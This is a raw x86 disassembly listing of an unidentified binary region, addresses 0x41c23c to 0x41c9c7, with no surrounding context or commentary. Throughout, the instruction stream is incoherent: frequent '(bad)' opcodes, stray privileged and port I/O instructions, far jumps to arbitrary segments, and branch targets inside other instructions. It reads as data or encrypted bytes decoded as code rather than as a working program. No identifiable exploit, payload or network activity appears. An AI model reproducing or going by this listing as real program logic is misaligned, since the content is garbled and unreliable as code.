  41c23c:	lds    edi,FWORD PTR [esi+0x28]
  41c23f:	add    eax,0x2793a976
  41c244:	add    eax,0xbdaf4bb8
  41c249:	cmc    
  41c24a:	adc    BYTE PTR [esi+ecx*2+0x6baf02e1],cl
  41c251:	in     al,0xaa
  41c253:	push   ds
  41c254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c255:	imul   ebp,DWORD PTR [eax+0x6e],0x73653e27
  41c25c:	push   eax
  41c25d:	pop    ebx
  41c25e:	pop    ds
  41c25f:	mov    al,0x7
  41c261:	cwde   
  41c262:	sti    
  41c263:	retf   0x7efd
  41c266:	cdq    
  41c267:	sbb    DWORD PTR [edx],ebp
  41c269:	hlt    
  41c26a:	sbb    ah,BYTE PTR [edi+0x64]
  41c26d:	retf   
  41c26e:	xor    BYTE PTR [esi-0x45],bl
  41c271:	jmp    0xc23:0x41ca83ec
  41c278:	fwait
  41c279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27a:	mov    ah,0x6f
  41c27c:	sub    BYTE PTR [eax],ch
  41c27e:	cs inc ebp
  41c280:	cmp    al,0xa1
  41c282:	test   al,0xf9
  41c284:	lea    esp,[edx+ebx*1]
  41c287:	mov    eax,ds:0x7471eac3
  41c28c:	sub    eax,0xc2ebb886
  41c291:	lods   al,BYTE PTR ds:[esi]
  41c292:	(bad)  
  41c293:	cmp    cl,BYTE PTR [edx-0x725f427b]
  41c299:	mov    ebp,0x4d9c9ca2
  41c29e:	mov    al,0x20
  41c2a0:	inc    ebp
  41c2a1:	push   ebp
  41c2a2:	scas   eax,DWORD PTR es:[edi]
  41c2a3:	adc    al,0xb7
  41c2a5:	mov    bl,0x9
  41c2a7:	and    eax,0xef095a58
  41c2ac:	sbb    edx,DWORD PTR [ecx+0x2e5755a3]
  41c2b2:	icebp  
  41c2b3:	lock outs dx,BYTE PTR ds:[esi]
  41c2b5:	xchg   BYTE PTR [ebp-0xeeaff88],dl
  41c2bb:	ficomp DWORD PTR [edi+0xd739adb]
  41c2c1:	mov    esi,0x6c103159
  41c2c6:	pop    ds
  41c2c7:	mov    ch,0x8c
  41c2c9:	dec    edx
  41c2ca:	js     0x41c2b4
  41c2cc:	inc    esp
  41c2cd:	push   0x35eb8b06
  41c2d2:	std    
  41c2d3:	js     0x41c29c
  41c2d5:	test   BYTE PTR [eax],0x7
  41c2d8:	ficomp WORD PTR [ebx]
  41c2da:	(bad)  
  41c2db:	mov    ds:0x35ce15bc,eax
  41c2e0:	shr    BYTE PTR [ebp-0x33da25c2],1
  41c2e6:	jno    0x41c2ff
  41c2e8:	js     0x41c27b
  41c2ea:	imul   edi,DWORD PTR [ecx+0x13115807],0x884436b5
  41c2f4:	add    dh,dh
  41c2f6:	xor    ah,BYTE PTR [esi]
  41c2f8:	or     ecx,DWORD PTR [edi+0x9]
  41c2fb:	sub    DWORD PTR [ecx+0x5bb4a61],0x35989917
  41c305:	push   edx
  41c306:	add    al,0x5d
  41c308:	sub    BYTE PTR [ecx+ebp*4],ah
  41c30b:	push   0x6eb8a607
  41c310:	sub    dh,BYTE PTR [ecx]
  41c312:	test   eax,esp
  41c314:	ins    BYTE PTR es:[edi],dx
  41c315:	bound  edx,QWORD PTR [esi-0x3fa63715]
  41c31b:	sbb    al,0xe5
  41c31d:	sub    cl,bh
  41c31f:	jne    0x41c36d
  41c321:	jne    0x41c2c6
  41c323:	ins    BYTE PTR es:[edi],dx
  41c324:	push   ebp
  41c325:	mov    esp,0x17b1a773
  41c32a:	addr16 call 0x94d7363
  41c330:	sbb    esi,DWORD PTR [esi-0x539c4747]
  41c336:	pop    ss
  41c337:	int3   
  41c338:	inc    esi
  41c339:	pop    ecx
  41c33a:	push   eax
  41c33b:	inc    ebp
  41c33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c33d:	es cdq 
  41c33f:	xor    eax,0x43e635ca
  41c344:	fwait
  41c345:	dec    ebx
  41c346:	xchg   edi,eax
  41c347:	popa   
  41c348:	dec    esp
  41c349:	sub    BYTE PTR [ecx],bl
  41c34b:	bound  edx,QWORD PTR [ebx+ecx*1+0x48]
  41c34f:	jmp    0x7b583ce7
  41c354:	ds ret 0xf6a6
  41c358:	adc    eax,0xad285915
  41c35d:	(bad)  
  41c35e:	lds    ebp,FWORD PTR [ebx-0x742e563a]
  41c364:	push   DWORD PTR [esi+0x56]
  41c367:	mov    edi,0xe0e535d
  41c36c:	mov    ch,BYTE PTR [edx]
  41c36e:	(bad)  
  41c36f:	jae    0x41c35f
  41c371:	outs   dx,BYTE PTR ds:[esi]
  41c372:	mov    BYTE PTR [ebp-0x5183db2],0x87
  41c379:	mov    esi,fs
  41c37b:	xor    ecx,DWORD PTR [eax-0x25]
  41c37e:	push   0xa
  41c380:	es gs test ecx,edi
  41c384:	test   DWORD PTR [edi+0x1e],ecx
  41c387:	enter  0xbacb,0x2b
  41c38b:	iret   
  41c38c:	jmp    0x41c39a
  41c38e:	test   al,0x28
  41c390:	aaa    
  41c391:	sahf   
  41c392:	lds    eax,FWORD PTR [edi-0x44e0d932]
  41c398:	xor    DWORD PTR [edi+0x4e],esi
  41c39b:	cmp    eax,0xe089f775
  41c3a0:	push   eax
  41c3a1:	int3   
  41c3a2:	pusha  
  41c3a3:	stos   DWORD PTR es:[edi],eax
  41c3a4:	cmp    BYTE PTR [ebp-0x16],dh
  41c3a7:	test   ebx,0x2c25c7c2
  41c3ad:	dec    eax
  41c3ae:	ret    0xdb58
  41c3b1:	into   
  41c3b2:	je     0x41c404
  41c3b4:	mov    eax,0x3a3eb42a
  41c3b9:	test   eax,0xd016e80b
  41c3be:	test   eax,0x987d2be8
  41c3c3:	ins    DWORD PTR es:[edi],dx
  41c3c4:	jae    0x41c3a6
  41c3c6:	ret    
  41c3c7:	push   esi
  41c3c8:	push   edx
  41c3c9:	mov    ebp,0x61aaa8b8
  41c3ce:	dec    ebx
  41c3cf:	int3   
  41c3d0:	enter  0x96ef,0xee
  41c3d4:	adc    bh,BYTE PTR [eax]
  41c3d6:	add    bl,BYTE PTR [ebx-0x47]
  41c3d9:	stos   BYTE PTR es:[edi],al
  41c3da:	mov    ebx,0x308f6a2d
  41c3e0:	mov    eax,ds:0x3e340625
  41c3e5:	(bad)
  41c3e9:	mov    ah,0x92
  41c3eb:	or     ch,al
  41c3ed:	inc    esp
  41c3ee:	or     dh,cl
  41c3f0:	iret   
  41c3f1:	mov    ebx,0xc2399fdd
  41c3f6:	cmp    eax,0xc3e55e51
  41c3fb:	mov    WORD PTR [edx-0x78],?
  41c3fe:	jb     0x41c3ba
  41c400:	jp     0x41c43c
  41c402:	fisub  DWORD PTR [eax-0x15]
  41c405:	in     eax,0x49
  41c407:	fld    DWORD PTR [ebp+0x37]
  41c40a:	into   
  41c40b:	push   esp
  41c40c:	dec    edi
  41c40d:	xor    al,0x74
  41c40f:	adc    ch,dl
  41c411:	cmp    edx,DWORD PTR ds:0x7564492
  41c417:	js     0x41c429
  41c419:	sbb    bl,BYTE PTR [ebp+ebp*1-0x26]
  41c41d:	enter  0x67c1,0xe1
  41c421:	hlt    
  41c422:	xor    BYTE PTR [esi-0x6572276c],ch
  41c428:	sub    edi,esp
  41c42a:	adc    DWORD PTR [ecx-0x252b4c74],esi
  41c430:	int3   
  41c431:	stos   BYTE PTR es:[edi],al
  41c432:	mov    bh,0x4a
  41c434:	div    DWORD PTR [ebx+0x464817b6]
  41c43a:	mov    BYTE PTR [edx],0x9
  41c43d:	icebp  
  41c43e:	xchg   DWORD PTR [ecx],edx
  41c440:	push   edi
  41c441:	push   esp
  41c442:	jmp    0x3b93:0x71f02c21
  41c449:	adc    ah,al
  41c44b:	(bad)  
  41c44c:	fst    DWORD PTR [eax*2-0x78639624]
  41c453:	sbb    eax,0x43992899
  41c458:	repz daa 
  41c45a:	dec    esp
  41c45b:	outs   dx,BYTE PTR ds:[esi]
  41c45c:	xchg   edi,eax
  41c45d:	mov    ecx,0x43adeaf5
  41c462:	mov    ebp,DWORD PTR [ecx-0x6d91fece]
  41c468:	mov    WORD PTR [ebp+0x76efed21],gs
  41c46e:	add    DWORD PTR [edx+0x7c],edi
  41c471:	std    
  41c472:	enter  0x96cc,0x58
  41c476:	mov    ah,0xab
  41c478:	xchg   ebp,eax
  41c479:	mov    BYTE PTR [eax-0x22b00fc3],cl
  41c47f:	mov    ch,0x6c
  41c481:	mov    dh,BYTE PTR [ecx]
  41c483:	add    BYTE PTR [ebp-0x53],cl
  41c486:	or     al,0x24
  41c488:	sub    al,0x37
  41c48a:	(bad)  
  41c48b:	cwde   
  41c48c:	in     al,dx
  41c48d:	in     eax,0x38
  41c48f:	leave  
  41c490:	test   al,0x26
  41c492:	aas    
  41c493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c494:	pop    ecx
  41c495:	popf   
  41c496:	and    eax,0x8e754638
  41c49b:	sbb    ah,BYTE PTR [edi-0x64]
  41c49e:	stc    
  41c49f:	inc    edx
  41c4a0:	(bad)  
  41c4a1:	retf   0x8320
  41c4a4:	add    esp,DWORD PTR [edi+0x35]
  41c4a7:	cld    
  41c4a8:	pop    edi
  41c4a9:	rcl    DWORD PTR [edi],0x4c
  41c4ac:	or     ebx,eax
  41c4ae:	add    bh,BYTE PTR [ecx-0x2c439325]
  41c4b4:	ds push esi
  41c4b6:	sar    DWORD PTR [eax-0x325b9d83],1
  41c4bc:	push   edx
  41c4bd:	mov    WORD PTR [edi-0x3485587d],fs
  41c4c3:	dec    eax
  41c4c4:	sar    BYTE PTR [edi+ecx*1+0x57],cl
  41c4c8:	dec    eax
  41c4c9:	and    eax,ebx
  41c4cb:	jecxz  0x41c50c
  41c4cd:	add    cl,BYTE PTR [esi-0x27d29544]
  41c4d3:	fwait
  41c4d4:	dec    ebp
  41c4d5:	or     DWORD PTR [esi],edx
  41c4d7:	or     dh,dh
  41c4d9:	add    ch,BYTE PTR [edx+eiz*2-0x5a9426bf]
  41c4e0:	add    eax,0xe5fd2706
  41c4e5:	push   0x39
  41c4e7:	fild   WORD PTR [ebp+0x1be8a7d8]
  41c4ed:	clc    
  41c4ee:	mov    ch,0x3f
  41c4f0:	pop    ss
  41c4f1:	xor    dh,BYTE PTR [edx]
  41c4f3:	fistp  WORD PTR [eax-0x12]
  41c4f6:	push   esp
  41c4f7:	icebp  
  41c4f8:	inc    edx
  41c4f9:	sar    ecx,cl
  41c4fb:	push   esp
  41c4fc:	sub    DWORD PTR [edi+edi*8],edx
  41c4ff:	nop
  41c500:	pop    ecx
  41c501:	sar    BYTE PTR [edx],cl
  41c503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c504:	push   ss
  41c505:	repz aas 
  41c507:	or     bl,BYTE PTR [ecx]
  41c509:	xchg   ebp,eax
  41c50a:	or     DWORD PTR [ebx+eax*8],edi
  41c50d:	cwde   
  41c50e:	add    BYTE PTR [eax],ch
  41c510:	and    eax,0x72e606d8
  41c515:	lods   eax,DWORD PTR ds:[esi]
  41c516:	jbe    0x41c58c
  41c518:	mov    al,ds:0xeff4434d
  41c51d:	xchg   edx,eax
  41c51e:	lea    ebx,[ecx]
  41c520:	retfw  0xeddd
  41c524:	imul   ecx,DWORD PTR [ecx],0xffffff8f
  41c527:	out    dx,al
  41c528:	jnp    0x41c502
  41c52a:	fimul  WORD PTR [ebx+eiz*4+0x74]
  41c52e:	je     0x41c4c5
  41c530:	(bad)  
  41c531:	mov    esi,0xb101e277
  41c536:	sbb    BYTE PTR [edx+0x42],dh
  41c539:	inc    ebp
  41c53a:	outs   dx,BYTE PTR ds:[esi]
  41c53b:	push   esp
  41c53c:	adc    al,0xcc
  41c53e:	pop    ds
  41c53f:	and    al,0x76
  41c541:	fs fs gs rol ah,cl
  41c546:	call   0xd523ff55
  41c54b:	int    0xe7
  41c54d:	push   0xe205d5a1
  41c552:	xchg   esi,eax
  41c553:	aad    0x34
  41c555:	pop    eax
  41c556:	rcl    BYTE PTR [esi-0x6],1
  41c559:	mov    al,0x53
  41c55b:	cld    
  41c55c:	mov    al,ds:0xa35f5a0a
  41c561:	adc    al,0xcd
  41c563:	imul   ecx,DWORD PTR [edi-0x700469dc],0xa6b36780
  41c56d:	xchg   DWORD PTR [esp+ebp*2-0xb74d46f],esi
  41c574:	aas    
  41c575:	leave  
  41c576:	add    cl,BYTE PTR [ebx]
  41c578:	adc    ebp,DWORD PTR [ebp+0x6d33abd6]
  41c57e:	pop    ss
  41c57f:	mov    ebx,0x784298bd
  41c584:	retf   0xbb4c
  41c587:	adc    BYTE PTR [esi],cl
  41c589:	dec    esp
  41c58a:	dec    edi
  41c58b:	ds pop edi
  41c58d:	inc    edx
  41c58e:	xchg   esp,eax
  41c58f:	mov    al,0xf6
  41c591:	data16 jno 0x41c574
  41c594:	iret   
  41c595:	in     eax,0x9b
  41c597:	mov    edx,0x5720c4c5
  41c59c:	mov    al,ds:0x9ec6e212
  41c5a1:	arpl   WORD PTR [eax+0x7a],di
  41c5a4:	and    cl,bh
  41c5a6:	outs   dx,BYTE PTR ds:[esi]
  41c5a7:	outs   dx,BYTE PTR ds:[esi]
  41c5a8:	not    dh
  41c5aa:	add    al,0xb
  41c5ac:	pop    ecx
  41c5ad:	jecxz  0x41c5f7
  41c5af:	clc    
  41c5b0:	adc    dh,BYTE PTR [edx+0x5dd70506]
  41c5b6:	sub    eax,DWORD PTR [eax+0x4e]
  41c5b9:	ret    0x35e4
  41c5bc:	sbb    BYTE PTR [edi],ch
  41c5be:	scas   al,BYTE PTR es:[edi]
  41c5bf:	add    al,0xda
  41c5c1:	aam    0x6
  41c5c3:	pop    ds
  41c5c4:	call   0x741e:0x3b786fcf
  41c5cb:	cwde   
  41c5cc:	(bad)  
  41c5cd:	repnz scas eax,DWORD PTR es:[edi]
  41c5cf:	cmp    BYTE PTR [ebx+0x7a0ac220],ah
  41c5d5:	push   esp
  41c5d6:	mov    ah,0x69
  41c5d8:	stos   DWORD PTR es:[edi],eax
  41c5d9:	pop    es
  41c5da:	aad    0x64
  41c5dc:	sbb    eax,0x5335f085
  41c5e1:	sar    BYTE PTR [ecx+0x5b7b8b27],0x22
  41c5e8:	outs   dx,BYTE PTR ds:[esi]
  41c5e9:	das    
  41c5ea:	dec    ebp
  41c5eb:	aaa    
  41c5ec:	outs   dx,DWORD PTR ds:[esi]
  41c5ed:	out    0x9d,al
  41c5ef:	jecxz  0x41c634
  41c5f1:	nop
  41c5f2:	xlat   BYTE PTR ds:[ebx]
  41c5f3:	jle    0x41c624
  41c5f5:	xchg   esi,eax
  41c5f6:	std    
  41c5f7:	jne    0x41c5e3
  41c5f9:	lods   al,BYTE PTR ds:[esi]
  41c5fa:	xor    ecx,DWORD PTR [ecx-0xed8e413]
  41c600:	daa    
  41c601:	aad    0xdc
  41c603:	imul   ebp,DWORD PTR [ebx+0x345880e9],0xffffffdb
  41c60a:	gs scas eax,DWORD PTR es:[edi]
  41c60c:	jbe    0x41c675
  41c60e:	xchg   ecx,eax
  41c60f:	std    
  41c610:	aaa    
  41c611:	mov    ch,0x93
  41c613:	sbb    BYTE PTR ds:0xd46de5b6,cl
  41c619:	call   0x48db766c
  41c61e:	mov    esi,DWORD PTR ds:0x93f42bbf
  41c624:	add    ecx,DWORD PTR [ebx+0x17]
  41c627:	dec    edx
  41c628:	int    0x1a
  41c62a:	xor    DWORD PTR [edx],ecx
  41c62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c62d:	in     al,0x67
  41c62f:	mov    esi,0x46b7f404
  41c634:	(bad)  
  41c636:	push   0xfffffff1
  41c638:	pop    ecx
  41c639:	aad    0x68
  41c63b:	out    0xe7,al
  41c63d:	mov    esp,0x7607c9e5
  41c642:	cmc    
  41c643:	inc    edi
  41c644:	loope  0x41c66e
  41c646:	add    edi,DWORD PTR [esi]
  41c648:	sub    ch,ch
  41c64a:	imul   esp,DWORD PTR [edi],0x851b4e8e
  41c650:	sub    DWORD PTR [ebp+0x21],0xffffffab
  41c654:	inc    eax
  41c655:	lods   al,BYTE PTR ds:[esi]
  41c656:	xchg   esi,eax
  41c657:	lahf   
  41c658:	and    ax,WORD PTR [esi-0x42]
  41c65c:	adc    al,0x52
  41c65e:	(bad)  
  41c65f:	mov    ds:0x4421790d,eax
  41c664:	(bad)  
  41c666:	cmp    DWORD PTR [ecx+ebx*1],esp
  41c669:	cmp    DWORD PTR [esp+ebp*8+0x55],ebp
  41c66d:	leave  
  41c66e:	mov    ch,0xe1
  41c670:	ss mov bl,0xc0
  41c673:	mov    DWORD PTR [ebp-0x77],0xbb52783
  41c67a:	jle    0x41c61a
  41c67c:	fdivrp st(1),st
  41c67e:	gs in  al,0x64
  41c681:	jne    0x41c6f9
  41c683:	push   es
  41c684:	aas    
  41c685:	repz pop eax
  41c687:	mov    bh,0xd2
  41c689:	pop    ds
  41c68a:	jge    0x41c67d
  41c68c:	jb     0x41c64d
  41c68e:	out    dx,eax
  41c68f:	and    bl,ah
  41c691:	mov    ds:0xc3fab948,eax
  41c696:	es enter 0x924d,0x96
  41c69b:	mov    al,ds:0xa8f1c5d5
  41c6a0:	add    ecx,DWORD PTR [ecx]
  41c6a2:	retf   
  41c6a3:	or     ebp,edi
  41c6a5:	xor    cl,BYTE PTR [ebx-0x6b920dcd]
  41c6ab:	cvtpi2ps xmm4,QWORD PTR [ebx+0x61e626e5]
  41c6b2:	xchg   ecx,eax
  41c6b3:	jmp    FWORD PTR [esi+0x6a]
  41c6b6:	or     al,0x37
  41c6b8:	jmp    edi
  41c6ba:	fs iret 
  41c6bc:	es rcr ah,cl
  41c6bf:	inc    ebx
  41c6c0:	push   es
  41c6c1:	fisubr WORD PTR [eax-0x64d20cf1]
  41c6c7:	retf   0xec00
  41c6ca:	lods   eax,DWORD PTR ds:[esi]
  41c6cb:	bound  edx,QWORD PTR [ebp+0x70]
  41c6ce:	xchg   ecx,eax
  41c6cf:	or     al,0x85
  41c6d1:	xchg   DWORD PTR [edi-0x22],esp
  41c6d4:	or     esi,ebx
  41c6d6:	inc    ebx
  41c6d7:	pop    esp
  41c6d8:	imul   ebp,DWORD PTR [esi],0x78
  41c6db:	ret    0xb44c
  41c6de:	test   al,0xf3
  41c6e0:	loopne 0x41c697
  41c6e2:	jge    0x41c739
  41c6e4:	imul   eax,ebx,0x68
  41c6e7:	cmp    eax,ebx
  41c6e9:	bound  edx,QWORD PTR [ebx-0x7ee3a627]
  41c6ef:	ins    BYTE PTR es:[edi],dx
  41c6f0:	sub    al,0xce
  41c6f2:	stos   BYTE PTR es:[edi],al
  41c6f3:	sub    DWORD PTR [ecx-0x3a],eax
  41c6f6:	inc    ebp
  41c6f7:	push   es
  41c6f8:	push   ecx
  41c6f9:	dec    eax
  41c6fa:	mov    ds:0xd339f97,eax
  41c6ff:	xor    eax,0x3bdb6b45
  41c704:	cmc    
  41c705:	mov    cl,BYTE PTR [eax+0x67]
  41c708:	int    0x34
  41c70a:	and    BYTE PTR [edx],bl
  41c70c:	inc    edx
  41c70d:	mov    DWORD PTR [edx],ebx
  41c70f:	mov    esp,0x731907fb
  41c714:	fild   QWORD PTR [eax]
  41c716:	in     eax,0xcd
  41c718:	mov    bh,0x93
  41c71a:	add    al,0x81
  41c71c:	aam    0x25
  41c71e:	call   0x883e039b
  41c723:	stc    
  41c724:	jl     0x41c777
  41c726:	test   BYTE PTR [edi],ah
  41c728:	call   0x15d7:0x83d4bd2d
  41c72f:	jle    0x41c6c9
  41c731:	es (bad) 
  41c733:	pop    edi
  41c734:	cld    
  41c735:	fadd   DWORD PTR [edi+0x1eb2081]
  41c73b:	fadd   DWORD PTR ds:0xa17116c9
  41c741:	mov    ebx,0x77bb3910
  41c746:	pusha  
  41c747:	add    eax,0x1f9c58cc
  41c74c:	fs xchg esi,eax
  41c74e:	stc    
  41c74f:	push   ss
  41c750:	dec    ebp
  41c751:	mov    ah,0x33
  41c753:	push   ebp
  41c754:	shl    DWORD PTR [ebx+0x28],0xd3
  41c758:	icebp  
  41c759:	ficom  DWORD PTR [edi+edi*2-0x36a34ac8]
  41c760:	or     ebp,DWORD PTR [eax+eiz*1]
  41c763:	pop    ebp
  41c764:	rcr    DWORD PTR es:[edi-0x2],cl
  41c768:	es ret 0x7439
  41c76c:	popf   
  41c76d:	jbe    0x41c71c
  41c76f:	lds    edx,FWORD PTR [ebx-0xf6b9c13]
  41c775:	mov    ds,WORD PTR [edi]
  41c777:	or     BYTE PTR [ebx+0x3c1209e3],cl
  41c77d:	sahf   
  41c77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c77f:	popf   
  41c780:	(bad)  [ebp+eiz*8-0x61]
  41c784:	cld    
  41c785:	mov    ch,0x3
  41c787:	clc    
  41c788:	jmp    0xafdf:0xa91f2948
  41c78f:	(bad)  
  41c790:	xchg   ebp,eax
  41c791:	xor    eax,0x9024fc26
  41c796:	inc    ecx
  41c797:	out    dx,al
  41c798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c799:	cmc    
  41c79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c79b:	mov    DWORD PTR [ecx-0x56],esi
  41c79e:	xor    DWORD PTR ds:[esi+ecx*1+0x4c34ba36],0xffffffb7
  41c7a7:	mov    al,0xfa
  41c7a9:	mov    bl,0xba
  41c7ab:	mov    BYTE PTR [eax],dh
  41c7ad:	loopne 0x41c774
  41c7af:	adc    ch,ah
  41c7b1:	ins    DWORD PTR es:[edi],dx
  41c7b2:	cmp    ecx,DWORD PTR [ebx-0x63]
  41c7b5:	mov    ds:0x2dcd090f,eax
  41c7ba:	leave  
  41c7bb:	fnsave [ecx]
  41c7bd:	or     DWORD PTR [edi+ebx*1],ebx
  41c7c0:	jb     0x41c791
  41c7c2:	or     al,0xed
  41c7c4:	xlat   BYTE PTR ds:[ebx]
  41c7c5:	xchg   ch,dl
  41c7c7:	or     al,0x96
  41c7c9:	or     ah,0xfe
  41c7cc:	xor    al,0x77
  41c7ce:	mov    DWORD PTR [ebx+0x9f3eac8],ebx
  41c7d4:	or     al,ah
  41c7d6:	xor    al,0x4d
  41c7d8:	and    dl,BYTE PTR [edx]
  41c7da:	or     DWORD PTR [esi+0x16],0x4d1bb0e8
  41c7e1:	(bad)  
  41c7e2:	pushf  
  41c7e3:	mov    cl,0x5e
  41c7e5:	xor    eax,0xe28966cf
  41c7ea:	call   0x378c22dc
  41c7ef:	push   0xc3e8c151
  41c7f4:	fwait
  41c7f5:	sbb    al,0xa7
  41c7f7:	add    dh,BYTE PTR [edi+0x53c36c39]
  41c7fd:	add    al,0xd9
  41c7ff:	scas   al,BYTE PTR es:[edi]
  41c800:	xor    DWORD PTR [edx-0x6072d964],esi
  41c806:	rcl    DWORD PTR [ecx-0x26],cl
  41c809:	jmp    0x71fe:0xf7ed36a5
  41c810:	test   eax,0x63cc1819
  41c815:	js     0x41c7e1
  41c817:	stos   DWORD PTR es:[edi],eax
  41c818:	jno    0x41c7a0
  41c81a:	dec    esi
  41c81b:	mov    edx,0x754dd3b1
  41c820:	xor    BYTE PTR [esi],0xd2
  41c823:	test   BYTE PTR [edi+0x22],bh
  41c826:	sbb    dl,BYTE PTR [edi]
  41c828:	iret   
  41c829:	cld    
  41c82a:	xchg   ebp,eax
  41c82b:	lock test WORD PTR ss:[esi+edx*4-0x31b4e56e],bp
  41c835:	inc    ecx
  41c836:	out    dx,eax
  41c837:	(bad)  
  41c838:	sub    esi,eax
  41c83a:	stos   DWORD PTR es:[edi],eax
  41c83b:	in     al,dx
  41c83c:	mov    dh,0x4e
  41c83e:	inc    esi
  41c83f:	pop    ebp
  41c840:	mov    edx,0xc1a7d09a
  41c845:	jp     0x41c7e9
  41c847:	lea    esp,[edi+0xc]
  41c84a:	in     al,0x74
  41c84c:	mov    dh,0x71
  41c84e:	mov    WORD PTR [edx-0x2b],es
  41c851:	(bad)  
  41c852:	xor    eax,0xe8f8aebf
  41c857:	sub    al,0xae
  41c859:	xor    eax,0xd3d821a7
  41c85e:	bound  esp,QWORD PTR [eax]
  41c860:	mov    bh,0xb3
  41c862:	cmp    al,0xb1
  41c864:	add    DWORD PTR [ecx],esi
  41c866:	adc    BYTE PTR [ecx-0x2f6f518a],dh
  41c86c:	add    eax,0x61ff8d4b
  41c871:	push   edx
  41c872:	fmul   QWORD PTR [ebx+ebp*1]
  41c875:	cdq    
  41c876:	mov    bh,0xa2
  41c878:	outs   dx,DWORD PTR ds:[esi]
  41c879:	jle    0x41c8a5
  41c87b:	iret   
  41c87c:	clc    
  41c87d:	inc    ebp
  41c87e:	bound  eax,QWORD PTR [ebp+0x4a]
  41c881:	test   al,0x2
  41c883:	mov    ah,0xbb
  41c885:	in     eax,0x9
  41c887:	xchg   ebx,eax
  41c888:	loope  0x41c8b6
  41c88a:	and    edi,DWORD PTR [edi+edx*2]
  41c88d:	pop    ss
  41c88e:	(bad)  
  41c88f:	pop    esi
  41c890:	rol    ebp,1
  41c892:	xor    BYTE PTR [ecx-0x5c],bh
  41c895:	mov    dh,0x22
  41c897:	mov    edi,0xcd7daddd
  41c89c:	push   ds
  41c89d:	cmp    eax,0x43cb1e2c
  41c8a2:	adc    al,0xc
  41c8a4:	test   eax,0xf8a1016
  41c8a9:	fidivr WORD PTR [eax-0x9]
  41c8ac:	pop    ebp
  41c8ad:	mov    eax,DWORD PTR [edx]
  41c8af:	arpl   si,cx
  41c8b1:	cld    
  41c8b2:	mov    ecx,0x2ce5b815
  41c8b7:	cmp    eax,0xcb9471f6
  41c8bc:	out    dx,eax
  41c8bd:	push   ebx
  41c8be:	or     eax,0x53a151f3
  41c8c3:	or     BYTE PTR [esi+0x390c17c6],bh
  41c8c9:	out    dx,eax
  41c8ca:	test   eax,0x9601368
  41c8cf:	pop    esi
  41c8d0:	sub    DWORD PTR [ebx-0x17],0x4d9abf1a
  41c8d7:	call   0x6d979d96
  41c8dc:	and    edx,edi
  41c8de:	lock mov ebx,0xed759ad4
  41c8e4:	imul   ebx,ebp,0x1d66be90
  41c8ea:	sbb    esi,edi
  41c8ec:	pop    es
  41c8ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8ee:	sbb    dl,BYTE PTR ss:[ecx]
  41c8f1:	mov    cl,0xf6
  41c8f3:	iret   
  41c8f4:	inc    edx
  41c8f5:	in     eax,0xb5
  41c8f7:	pop    esi
  41c8f8:	inc    ebx
  41c8f9:	mov    esp,0xfcad31c3
  41c8fe:	add    dl,ch
  41c900:	sbb    eax,DWORD PTR [ebp+0x7d]
  41c903:	pop    ebx
  41c904:	dec    ebx
  41c905:	xchg   ebp,eax
  41c906:	xchg   esi,eax
  41c907:	stc    
  41c908:	jp     0x41c901
  41c90a:	mov    esi,0x5b8a1415
  41c90f:	(bad)  
  41c910:	fldenv [esp+ebp*1-0x46bc17eb]
  41c917:	cmc    
  41c918:	test   BYTE PTR [ecx-0x53e66950],dl
  41c91e:	sbb    edx,ecx
  41c920:	pop    ebp
  41c921:	sahf   
  41c922:	inc    BYTE PTR [ecx+0x60]
  41c925:	mov    al,ds:0x9bfe3798
  41c92a:	and    edi,ecx
  41c92c:	or     al,0x95
  41c92e:	mov    esp,edx
  41c930:	rcl    DWORD PTR [esi],0xcf
  41c933:	jge    0x41c8ed
  41c935:	mov    ah,0x8
  41c937:	or     bh,BYTE PTR [eax+0x5a3c2b1a]
  41c93d:	inc    edi
  41c93e:	pop    edi
  41c93f:	mov    ebx,0xe0354616
  41c944:	sub    DWORD PTR [esi+0x47],ebp
  41c947:	repz mov al,0xd6
  41c94a:	adc    BYTE PTR [edx+eiz*4-0x12],bh
  41c94e:	rcr    dh,cl
  41c950:	push   ebp
  41c951:	data16 xor BYTE PTR [eax+0x43],al
  41c955:	pushf  
  41c956:	push   ecx
  41c957:	push   eax
  41c958:	pop    edi
  41c959:	iret   
  41c95a:	call   0x51f633
  41c95f:	push   0xc5773c46
  41c964:	in     al,dx
  41c965:	cmp    bl,BYTE PTR [ecx+0x53]
  41c968:	xchg   esi,eax
  41c969:	mov    di,bx
  41c96c:	jns    0x41c962
  41c96e:	and    DWORD PTR [eax-0x6a760c41],0x808aebb5
  41c978:	pop    ebx
  41c979:	xchg   ebx,eax
  41c97a:	dec    ebp
  41c97b:	shl    DWORD PTR [ebp+edx*1-0x64],1
  41c97f:	(bad)  
  41c980:	test   al,0x72
  41c982:	mov    bl,0x14
  41c984:	test   al,0x5a
  41c986:	inc    edx
  41c987:	cwde   
  41c988:	mov    esp,esi
  41c98a:	mov    eax,0x46517066
  41c98f:	scas   al,BYTE PTR es:[edi]
  41c990:	adc    edi,DWORD PTR [ebp-0x6c4d9dc1]
  41c996:	push   ecx
  41c997:	not    BYTE PTR [ebx+edx*1-0x67]
  41c99b:	or     BYTE PTR [ebx+ecx*2+0x2c],bh
  41c99f:	sub    al,0x49
  41c9a1:	rcl    BYTE PTR [edx],0x93
  41c9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9a5:	jno    0x41c966
  41c9a7:	into   
  41c9a8:	retf   0x2617
  41c9ab:	lea    ebx,[edx-0x72]
  41c9ae:	bound  ebx,QWORD PTR [esp+esi*8-0x5a]
  41c9b2:	mov    BYTE PTR [edx],dh
  41c9b4:	addr16 xchg edi,eax
  41c9b6:	xor    eax,0xbe5524ba
  41c9bb:	test   DWORD PTR [edx],ebp
  41c9bd:	stos   DWORD PTR es:[edi],eax
  41c9be:	push   ds
  41c9bf:	mov    bl,0xd1
  41c9c1:	xchg   esp,eax
  41c9c2:	fwait
  41c9c3:	dec    ebx
  41c9c4:	in     al,0xd3
  41c9c6:	das    
  41c9c7:	sub    BYTE PTR [ebp+0x1aa14703],bl
